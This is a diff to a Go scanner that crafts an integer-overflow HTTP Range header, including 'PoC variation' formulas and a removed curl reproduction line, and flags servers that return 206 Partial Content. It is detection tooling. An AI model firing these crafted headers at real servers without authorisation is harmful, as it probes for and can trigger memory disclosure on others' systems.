@@ -3,11 +3,13 @@ package main
 import (
 	"bufio"
 	"crypto/tls"
+	"errors"
 	"flag"
 	"fmt"
 	"log"
 	"net/http"
 	"os"
+	"strconv"
 
 	"github.com/projectdiscovery/retryablehttp-go"
 )
@@ -24,10 +26,10 @@ func main() {
 		if err != nil {
 			log.Fatalf("error making baseline request: %+v", err)
 		}
-
-		if !cl.CheckVuln(baseResp) {
+		res, err := cl.CheckVuln(baseResp); if err != nil {
 		    continue
 		}
+		fmt.Printf("%s\t%d,%d\n", res.url, res.rs, res.re)
 	}
 }
 
@@ -68,10 +70,10 @@ func (cl *Client) DoRequest(u string, rh string) (resp *http.Response, err error
 
 // CheckVuln injects HTTP request with an integer overflow Range header, and
 // checks vulnerability based on a HTTP response that includes 206 Partial Content and Content-Range header
-func (cl *Client) CheckVuln(r *http.Response) bool {
-	contentLength := r.ContentLength
-	bytesLength := contentLength + 623
-	rangeHeader := fmt.Sprintf("bytes=-%d,-9223372036854%d", bytesLength, 776000 - bytesLength)
+func (cl *Client) CheckVuln(r *http.Response) (Result, error) {
+	cLen := int(r.ContentLength)
+	rs, re := overflowRange(cLen)
+	rangeHeader := fmt.Sprintf("bytes=%d,%d", rs, re)
 
 	url := r.Request.URL.String()
 	resp, err := cl.DoRequest(url, rangeHeader)
@@ -80,9 +82,27 @@ func (cl *Client) CheckVuln(r *http.Response) bool {
 	}
 
 	if resp.StatusCode == 206 && resp.Header.Get("Content-Range") != "" {
-		fmt.Printf("%s\tcurl -ik %s -X GET -r -%d,-9223372036854%d\n", url, url, bytesLength, 776000 - bytesLength)
-	    return true
+	    return Result{url, rs, re}, nil
 	}
-	return false
+	return Result{}, errors.New("not vulnerable")
+}
+
+func overflowRange(cLen int) (rs, re int) {
+    // PoC variation 1
+	// bytesLength := cLen + 623
+	// rs = -bytesLength
+	// re, _ = strconv.Atoi(fmt.Sprintf("-9223372036854%d", 776000 - bytesLength))
+
+	// PoC variation 2
+	n := cLen + 605
+	t, _ := strconv.ParseInt("0x8000000000000000",0,64)
+	rs, re = -n, -(int(t) - n)
+
+	return
+}
+
+type Result struct {
+	url string
+	rs, re int
 }
 
